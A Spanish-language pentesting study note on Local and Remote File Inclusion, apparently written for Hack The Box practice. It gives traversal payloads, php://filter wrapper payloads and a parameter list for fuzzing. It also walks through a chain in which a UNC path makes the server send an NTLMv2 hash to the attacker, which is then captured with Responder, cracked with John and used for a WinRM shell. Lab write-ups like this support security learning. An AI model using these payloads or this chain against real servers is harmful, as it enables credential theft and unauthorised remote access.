---
tags: [web, lfi]
---

> **Local File Inclusion (LFI)** y **Remote File Inclusion (RFI)** son vulnerabilidades web que permiten incluir archivos del sistema de archivos del servidor (LFI) o de URLs remotas (RFI) manipulando input del usuario. Esta guía se enfoca en lo que hemos practicado: path traversal básico y la cadena LFI → Responder → NTLMv2 → WinRM.

---

## Quickstart — Test universal

```bash
# Los 3 tests que delatan LFI:
../../../../etc/passwd           # path traversal clásico (Linux)
..\..\..\..\windows\win.ini      # path traversal (Windows)
php://filter/convert.base64-encode/resource=index.php    # wrapper test
```

---

## LFI to NTLM Hash Capture — The Responder Chain (Windows)

En targets **Windows + PHP**, LFI/RFI se puede encadenar con Responder para capturar hashes NTLMv2 sin tocar el sistema de archivos. Esta es una técnica poderosa cuando `allow_url_include` está Off y log poisoning no es viable.

### La cadena de ataque

```
LFI/RFI parameter → UNC path → SMB connection to attacker → Responder captures NTLMv2 hash → Crack with John → WinRM shell
```

### Paso 1 — Confirmar LFI en un servidor Windows + PHP

```bash
# Test con path de Windows
http://unika.htb/index.php?page=..\..\..\..\..\..\..\windows\win.ini

# Si el archivo carga → LFI confirmado, y sabemos que es Windows + PHP
```

### Paso 2 — Disparar autenticación NTLM vía UNC path

El `include()` de PHP en Windows resuelve rutas UNC (`\\host\share`) vía SMB. Cuando el servidor intenta conectarse a una ruta UNC controlada por el atacante, Windows automáticamente envía el hash NTLMv2 del proceso del servidor como parte del handshake SMB.

```bash
# En el parámetro vulnerable, usa una ruta UNC apuntando a tu IP de atacante:
http://target.htb/index.php?page=\\10.10.14.5\file

# O URL-encoded (para testear en navegador):
http://target.htb/index.php?page=%5C%5C10.10.14.5%5Cfile
```

### Paso 3 — Capturar el hash con Responder

```bash
# Iniciar Responder en tu interfaz VPN
$ sudo responder -I tun0

# Cuando el target se conecta, Responder captura:
[SMB] NTLMv2-SSP Client   : 10.129.12.192
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:8289f1...00000000
```

> 💡 **Por qué funciona:** `include()` de PHP en Windows llama a la Win32 API para abrir archivos. Las rutas UNC (`\\host\share\file`) disparan al cliente SMB para autenticarse al host especificado. Responder se hace pasar por un servidor SMB y captura el challenge-response NTLMv2.

### Paso 4 — Crackear el hash NTLMv2

```bash
# Guardar el hash capturado en un archivo, luego crackear:
$ john --format=netntlmv2 hash.txt
```

### Paso 5 — Obtener shell con las credenciales crackeadas

```bash
# Si WinRM (5985) está abierto:
$ evil-winrm -i target.htb -u Administrator -p 'cracked_password'

# O con NetExec para ejecución rápida de comandos:
$ netexec winrm target.htb -u Administrator -p 'cracked_password' -x 'whoami'
```

### Pre-requisitos para esta técnica

| Requisito | Cómo verificarlo |
| :-------- | :--------------- |
| Windows OS | nmap `-O` o comprobar si `C:\Windows\win.ini` carga |
| Servidor PHP | Apache/Nginx con PHP en Windows |
| Parámetro LFI o RFI | Cualquier parámetro que llame a `include()`, `require()` |
| SMB outbound (445) | El target debe poder alcanzar tu IP atacante en puerto 445 |
| Responder ejecutándose | `sudo responder -I tun0` en tu máquina atacante |

### Troubleshooting de la cadena Responder

| Problema | Solución |
| :------- | :------- |
| No se captura hash | Verificar firewall — puerto 445 debe ser alcanzable desde el target |
| Hash capturado pero no crackea | NTLMv2 puede tomar tiempo — usa reglas o un wordlist más grande |
| `include()` no resuelve UNC | Algunas configs de PHP deshabilitan rutas UNC — prueba otro parámetro |
| Responder muestra SMB pero sin hash | El target puede requerir SMB signing — prueba otro método de coerción |

### Ejemplo real — HTB Responder

Esta cadena exacta aparece en la máquina **Responder**:
1. Descubrir virtual host `unika.htb`
2. Encontrar parámetro `?page=` que incluye archivos PHP
3. Testear LFI con `..\..\..\..\windows\win.ini` → confirmado
4. Disparar RFI con `\\10.10.14.5\file` → Responder captura NTLMv2 de `Administrator`
5. Crackear con John → password: `badminton`
6. NetExec WinRM → `(Pwn3d!)` → shell como Administrator

---

## LFI Traversal — Lo básico

### Path traversal estándar

```bash
# Linux
../../../../etc/passwd
/../../../etc/passwd
....//....//....//....//etc/passwd    # double traversal (bypassea algunos filtros)

# Windows
..\..\..\..\windows\win.ini
..\..\..\..\windows\system32\drivers\etc\hosts
```

### Paths absolutos vs relativos

```bash
# Relativo (más común en CTFs)
http://target.htb/page.php?file=../../../../etc/passwd

# Absoluto
http://target.htb/page.php?file=/etc/passwd

# Letra de unidad (Windows)
http://target.htb/page.php?file=C:\Windows\win.ini
```

### Archivos sensibles por SO

| Linux | Windows |
| :---- | :------ |
| `/etc/passwd` | `C:\Windows\win.ini` |
| `/var/www/html/config.php` | `C:\Windows\System32\drivers\etc\hosts` |
| `/var/log/apache2/access.log` | `C:\inetpub\wwwroot\web.config` |

---

## PHP Wrappers — Lo esencial

### `php://filter` — Leer código fuente como base64

```bash
# Leer index.php
http://target.htb/page.php?file=php://filter/convert.base64-encode/resource=index.php

# Leer config.php
http://target.htb/page.php?file=php://filter/convert.base64-encode/resource=config.php

# Decodificar localmente
echo "PD9waHAg..." | base64 -d
```

> 💡 **Por qué funciona:** `php://filter` convierte el contenido del archivo a base64 *antes* de que `include()` lo procese. Como base64 es texto plano, PHP no intentará ejecutarlo como código.

---

## Parámetros comunes de LFI para fuzzear

```bash
# Estos parámetros suelen aceptar rutas de archivo:
file, page, include, inc, dir, path, folder, root, doc
lang, cmd, pg, style, pdf, template, php_path, doc_path
module, mod, content, site, load, show, read, view
```

---

## 🔗 Related

**Machines:** [[🧑‍🚒 Responder]]

**Guides:** [[🔐 NTLM]], [[🖥️ WinRM]]

---

## References

- [PayloadsAllTheThings — File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- [HackTricks — File Inclusion / Path Traversal](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
- [OWASP — File Inclusion](https://owasp.org/www-community/attacks/Includes)
- [PHP Stream Wrappers Manual](https://www.php.net/manual/en/wrappers.php)
